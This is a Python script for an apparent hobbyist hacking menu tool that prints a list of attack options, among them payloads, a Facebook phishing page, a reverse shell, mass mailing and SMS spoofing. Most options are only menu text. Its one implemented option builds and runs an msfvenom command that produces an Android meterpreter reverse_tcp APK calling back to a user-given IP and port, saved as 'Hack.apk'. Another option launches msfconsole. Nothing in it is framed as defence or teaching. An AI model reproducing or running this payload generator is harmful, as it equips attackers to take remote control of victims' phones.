import os;
import subprocess;
"""
class fg: 

        black='\033[30m'

        red='\033[31m'

        green='\033[32m'

        orange='\033[33m'

        blue='\033[34m'

        purple='\033[35m'

        cyan='\033[36m'

        lightgrey='\033[37m'

        darkgrey='\033[90m'

        lightred='\033[91m'

        lightgreen='\033[92m'

        yellow='\033[93m'

        lightblue='\033[94m'

        pink='\033[95m'
        lightcyan='\033[96m'
      """
"""
  *
 ***
*****
*****
Function to forlder  in directory and return ~~||True ~~||False||~~
*****
*****
 ***
  *
"""
def checkof(Directory,FName):
	listdirectory=os.listdir(Directory);
	if(FName in listdirectory):
		return True;
	else:
		return False;


"""
  *
 ***
*****
*****
Function to creat a forder in actual directory ok
*****
*****
 ***
  *
"""
def Makefolder(Directory,FName):
	if(checkof(Directory,FName)==False):
		os.mkdir(Directory+str("/"+FName));


"""
___________________________
#########FUNCTIONS#########
---------------------------
---------------------------
1.)checkof(path,folder name)
2.)Makefolder(path,folder name)

"""		
Makefolder("/sdcard","Arquam");						
print("\033[33             __ ");
print('\033[33m       .-        -.');
print("\033[31m      /            \ ");
print();
print("\033[32m     |,  .-.  .-.  ,|  ");
print("\033[31m     | )(_ /  \_ )( |  ");
print("     |/     /\     \|       ");
print('\033[32m     <__    ^^    __>');
print("\033[32m      \__|IIIIII|__/");
print();
print("\033[31m        \ IIIIII / ");
print("\033[31m         -------- " );
print("\033[31m            _ ");
input("\n\n\n\033[33mcontinue...");
print("\033[33m::::::::::::"*5);
print("\033[33m::::::::::::"*5);
print("\033[32m:::[1]\033[31m Payload (android)");
print("\033[32m:::[2]\033[31m Payload (iphone)")
print("\033[32m:::[3]\033[31m Payload (windows)")
print("\033[32m:::[4]\033[31m Phishing page(facebook)")
print("\033[32m:::[5]\033[31m Python reverse shell\033[93m*  ")
print("\033[32m:::[6]\033[31m Mass Mailer Attack")
print("\033[32m:::[7]\033[31m Powershell Attack Vectors")
print("\033[32m:::[8]\033[31m SMS Spoofing Attack Vector")
print("\033[32m:::[9]\033[31m Custom Exploits")
print("\033[32m:::[10]\033[31m SCCM Attack Vector")
print("\033[32m:::[11]\033[31m PSEXEC Powershell Injection")
print("\033[32m:::[12]\033[31m Help, Credits, and About")
print("\033[32m:::[13]\033[31m Update SET configuration")
print("\033[32m:::[14]\033[31m msfconsole\033[93m*")
print("\033[32m:::[15]\033[31m Exit")
print("\033[33m::::::::::::"*5);
print("\033[33m::::::::::::"*5);


#option input
option=int(input(""));

"""
here decision
"""
if(option==1):
	print("\t\t*************************")
	print("\t\t     Android Payload")
	print("\t\t*************************")
	Ip=input("\n\nIp: ");
	Port=int(input("\033[32mPort: "));
	command="msfvenom -p android/meterpreter/reverse_tcp LHOST="+str(Ip)+" LPORT="+str(Port)+" R> /sdcard/Arquam/Hack.apk";
	print("generating payload...");
	os.system("sleep 3")
	print(command);
	os.system(command);
if(option==14):
	os.system("msfconsole")
	